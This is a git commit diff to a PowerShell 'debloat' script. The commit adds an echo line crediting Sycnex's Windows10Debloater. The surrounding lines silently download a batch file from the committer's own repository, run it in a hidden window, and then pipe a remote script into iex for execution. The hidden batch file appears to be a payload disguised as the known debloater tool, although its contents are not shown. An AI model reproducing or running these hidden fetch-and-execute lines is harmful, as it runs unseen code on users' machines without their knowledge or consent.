3c1ea863303562485c39bbe7d86dc921794ad7e1
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-27 19:00:26 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,3 +1,4 @@
 iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\cmd-debloat.bat
 Start-Process -WindowStyle hidden -FilePath $env:TEMP\cmd-debloat.bat
+echo Windows10Debloater by Sycnex
 iwr -useb git.io/debloat|iex
